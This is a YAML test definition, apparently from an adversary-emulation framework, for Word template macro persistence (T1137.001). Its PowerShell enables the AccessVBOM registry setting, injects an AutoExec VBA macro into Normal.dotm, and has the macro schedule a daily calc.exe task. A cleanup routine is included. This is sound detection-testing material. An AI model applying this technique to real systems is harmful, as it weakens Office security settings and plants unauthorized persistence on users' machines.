- requirements: []
  name: Soumaia ART Tests - Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell
  description: Injects a Macro in the Word default template "Normal.dotm" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening. (requires elevation)
  tactic: persistence
  technique_id: T1137.001
  technique_name: 'Office Application Startup: Office Template Macros.'
  executors:
  - cleanup:
    - $registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"; $registryValue = "AccessVBOM"; $registryData1 = "1"; $registryData0 = "0"; $flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"; $flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"; $copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"; $docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"; schtasks /Delete /TN "OpenCalcTask" /F | Out-Null; if (Test-Path $copyPath) { Remove-Item -Force $docPath -ErrorAction SilentlyContinue; Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue; Write-Host "The original template has been restored" } else { Write-Host "The original template is present" }; if (Test-Path $flagPath1) { New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null; Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue; Write-Host "The original registry state has been restored" } elseif (Test-Path $flagPath2) { Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null; Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null; Write-Host "The original registry state has been restored" } else { Write-Host "The value $registryValue already existed in $registryKey." }
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: powershell -NoProfile -EncodedCommand ; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA }; $registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"; $registryValue = "AccessVBOM"; $registryData = "1"; $flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"; $flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"; $value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue; if ($value -eq "1") { Write-Host "The registry value '$registryValue' already exists with the required setting." } elseif ($value -eq "0") { Write-Host "The registry value was set to 0, temporarily changing to 1."; New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null; echo "flag1" > $flagPath1 } else { Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."; New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null; echo "flag2" > $flagPath2 }; Add-Type -AssemblyName Microsoft.Office.Interop.Word; $copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"; $docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"; Copy-Item -Path $docPath -Destination $copyPath -Force; $vbaCode = "  Sub AutoExec()`n  Dim applicationPath As String`n  Dim taskName As String`n  Dim runTime As String`n  Dim schTasksCmd As String`n  applicationPath = `"C:\Windows\System32\calc.exe`"`n  taskName = `"OpenCalcTask`"`n  runTime = `"20:04`"`n  schTasksCmd = `"schtasks /create /tn `"`"`" & taskName & `"`"`" /tr `"`"`" & applicationPath & `"`"`" /sc daily /st `" & runTime & `" /f`"`n  Shell `"cmd.exe /c `" & schTasksCmd, vbNormalFocus`n  End Sub"; $word = New-Object -ComObject Word.Application; $word.Visible = $false; $document = $word.Documents.Open($docPath); $vbaProject = $document.VBProject; $newModule = $vbaProject.VBComponents.Add(1); $newModule.CodeModule.AddFromString($vbaCode); $word.run("AutoExec"); $document.SaveAs($docPath); $document.Close(); $word.Quit(); [System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null; [System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null; [System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null; [System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null
